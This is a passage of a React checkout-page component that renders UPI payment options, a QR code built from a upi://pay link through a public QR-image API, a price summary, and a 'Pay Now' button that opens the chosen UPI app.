                          <div className="text-[14px] font-[800] tracking-[-1px]">
                            <span className="text-[#002970]">pay</span>
                            <span className="text-[#00baf2]">tm</span>
                          </div>
                        ) : (
                          <span className="w-[30px] h-[30px] rounded-full bg-gray-50 flex items-center justify-center text-[13px] font-bold">
                            {icon}
                          </span>
                        )}

                      </label>

                    ))}
                  </div>
                )}

              </div>

              {/* ========================================= */}
              {/* QR CODE PAYMENT SECTION (BELOW UPI SECTION) */}
              {/* ========================================= */}
              <div className="mb-[16px] border border-blue-200 bg-gradient-to-b from-blue-50/70 to-white rounded-[12px] p-4 text-center shadow-sm">
                <div
                  onClick={() => setIsQrDropdownOpen((prev) => !prev)}
                  className="flex items-center justify-between cursor-pointer select-none"
                >
                  <div className="flex items-center gap-2">
                    <span className="w-7 h-7 rounded-lg bg-blue-600 text-white flex items-center justify-center text-xs font-bold shadow-sm">
                      QR
                    </span>
                    <div className="text-left">
                      <p className="font-bold text-gray-900 text-[13px] leading-tight">Scan to Pay via Any UPI App</p>
                      <p className="text-[11px] text-gray-500">PhonePe, Paytm, BHIM & all UPI apps</p>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <span className="text-[10px] font-bold text-emerald-700 bg-emerald-100/90 px-2 py-0.5 rounded-full">
                      Instant
                    </span>
                    <span
                      className={`text-[#616173] text-[16px] font-semibold transition-transform duration-200 inline-block ${
                        isQrDropdownOpen ? "rotate-180" : ""
                      }`}
                    >
                      ⌄
                    </span>
                  </div>
                </div>

                {isQrDropdownOpen && (
                  <div className="pt-3 border-t border-blue-100/80 mt-3">
                    {/* QR Code Image */}
                    <div className="bg-white p-3 rounded-xl shadow-sm border border-gray-100 inline-block mx-auto my-1">
                      <img
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=240x240&margin=8&data=${encodeURIComponent(
                          `upi://pay?pa=${upiId}&pn=${encodeURIComponent(verifiedAccountName)}&am=${Number(
                            buydata?.length > 0
                              ? qtyAdd *
                                  (buydata[0]?.yesnoval
                                    ? +buydata[0]?.price + 20
                                    : +buydata[0]?.price) +
                                (finalPriceAll || 0)
                              : finalPriceAll || 0
                          ).toFixed(2)}&cu=INR`
                        )}`}
                        alt="UPI Payment QR Code"
                        className="w-44 h-44 mx-auto object-contain rounded-md"
                      />
                      <div className="mt-2 text-center">
                        <p className="text-[15px] font-bold text-gray-900">
                          ₹
                          {buydata?.length > 0
                            ? qtyAdd *
                                (buydata[0]?.yesnoval
                                  ? +buydata[0]?.price + 20
                                  : +buydata[0]?.price) +
                              (finalPriceAll || 0)
                            : finalPriceAll || 0}
                        </p>
                        <p className="text-[11px] text-gray-500 font-medium">{payeeName}</p>
                      </div>
                    </div>

                    <p className="text-[11px] text-gray-500 mt-2">
                      Scan with PhonePe, Paytm or any UPI app to complete payment.
                    </p>
                  </div>
                )}
              </div>



              <div className="mt-[16px] border border-[#d9dce8] rounded-[10px] px-[14px] py-[14px]">

                <div className="flex justify-between text-[13px] mb-[8px]">

                  <span>Shipping:</span>

                  <span className="font-[600]">FREE</span>

                </div>

                <div className="flex justify-between text-[13px] mb-[10px]">

                  <span>Total Product Price:</span>

                  <span>

                    ₹{buydata?.length > 0

                      ? qtyAdd *

                          (buydata[0]?.yesnoval

                            ? +buydata[0]?.price + 20

                            : +buydata[0]?.price) +

                        (finalPriceAll || 0)

                      : finalPriceAll || 0}

                  </span>

                </div>

                <div className="border-t border-[#d9dce8] pt-[10px] flex justify-between text-[15px] font-[700]">

                  <span>Order Total :</span>

                  <span>

                    ₹{buydata?.length > 0

                      ? qtyAdd *

                          (buydata[0]?.yesnoval

                            ? +buydata[0]?.price + 20

                            : +buydata[0]?.price) +

                        (finalPriceAll || 0)

                      : finalPriceAll || 0}

                  </span>

                </div>

              </div>

            </div>

          </div>

        )}



        <div className="w-full">

          <div className="w-full max-w-[500px] left-1/2 -translate-x-1/2 fixed bottom-0 z-[9999999]">

            <div className="w-full items-center justify-center flex bg-[rgb(248_248_255)]">

              <p className="w-full text-center text-[11px] px-[16px] py-[10px] text-[rgb(53_53_67)] font-normal">

                {showPaymentMethods

                  ? `Selected: ${

                      selectedPayment === "phonepe"

                        ? "PhonePe"

                        : selectedPayment === "paytm"

                        ? "Paytm"

                        : "UPI"

                    }`

                  : "Clicking on ‘Continue’ will not deduct any money"}

              </p>

            </div>

            <div className="w-full py-[12px] px-[16px] border-t-[1px] border-[#CECEDE] bg-white flex justify-between items-center">

              <div className="w-[50%] pr-2">

                <p className="w-fit text-[17px] text-[rgb(53_53_67)] font-bold">

                  ₹

                  {buydata?.length > 0

                    ? qtyAdd *

                    (buydata[0]?.yesnoval

                      ? +buydata[0]?.price + 20

                      : +buydata[0]?.price) +

                    finalPriceAll

                    : finalPriceAll}

                </p>

                <button

                  className="w-fit uppercase text-[rgb(159_32_137)] text-[13px] font-bold border-none bg-transparent m-0 p-0"

                  type="button"

                >

                  VIEW PRICE DETAILS

                </button>

              </div>

              <button

                type="button"

                onClick={() => {

                  if (!showPaymentMethods) {

                    handleContinueData();

                    return;

                  }



                  const orderAmount =

                    buydata?.length > 0

                      ? qtyAdd *

                          (buydata[0]?.yesnoval

                            ? +buydata[0]?.price + 20

                            : +buydata[0]?.price) +

                        (finalPriceAll || 0)

                      : finalPriceAll || 0;



                  localStorage.setItem("selectedPaymentApp", selectedPayment);

                  localStorage.setItem("ordertotal", String(orderAmount));



                  // Open the selected UPI app directly.

                  // Do NOT navigate to /payment.

                  openSelectedUPIApp(selectedPayment, orderAmount);

                }}

                className={`m-0 h-[44px] w-[50%]

                    border-[rgb(159_32_137)] p-[10px] bg-[rgb(159_32_137)] text-white text-[15px] font-[500] rounded-[4px] border-[1px] flex justify-center items-center`}

              >

                {showPaymentMethods ? "Pay Now" : "Continue"}

              </button>

            </div>

          </div>

        </div>

      </div>

    </>

  );

}



export default CheckOutpage;